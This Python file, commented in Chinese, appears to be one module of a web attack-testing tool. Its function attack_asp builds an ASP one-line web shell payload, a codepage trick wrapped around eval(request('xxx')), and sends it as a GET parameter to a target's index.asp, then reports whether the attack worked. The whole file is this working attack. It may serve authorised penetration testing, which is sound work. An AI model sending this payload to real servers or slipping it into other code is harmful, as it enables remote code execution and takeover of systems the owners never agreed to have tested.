import requests
import re
from .utils import make_request_with_timeout, process_attack_response


def attack_asp(url, headers, pattern, success, fail, error):
    """
    ASP攻击测试
    """
    # 定义 ASP 攻击 payload
    payload = "<%@codepage=65000%>" + '\n' + '<%response.codepage=65001:eval(request("xxx"))%>'
    
    # 构造攻击URL和参数
    attack_url = url + "index.asp"
    params = {"xxx": payload}

    # 发送请求
    success_flag, response_or_error, status_code = make_request_with_timeout(
        attack_url, headers, method='GET', params=params
    )
    
    # 处理响应
    return process_attack_response(
        "ASP攻击", success_flag, response_or_error, status_code, 
        pattern, success, fail, error
    )